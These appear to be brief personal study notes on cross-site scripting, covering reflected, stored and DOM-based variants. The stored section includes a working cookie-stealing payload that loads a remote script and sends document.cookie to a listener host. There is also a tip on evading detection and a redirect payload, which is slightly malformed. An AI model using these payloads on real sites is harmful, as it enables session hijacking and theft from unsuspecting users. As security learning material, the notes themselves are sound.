
when performing xss use print() or promt() as alert is easily picked up.
## reflected

![[Pasted image 20240801204808.png]]

## stored

the script is stored in the database 
test for html injection first

payload:

```
<script src=http://127.0.0.1:8080/gib_cookie.js></script>

gib_cookie:

var i = new Image;
i.src = 'http://127.0.0.1:8080/?'+document.cookie;
```

![[Pasted image 20240802153631.png]]

## DOM-based

client side has vulnerable javascript

```
<img src=x onerror="promt(1)"</img>
```
you can redirect user to another page
```
<img src=x onerror="window.href.location='https://google.com'"</img>
```


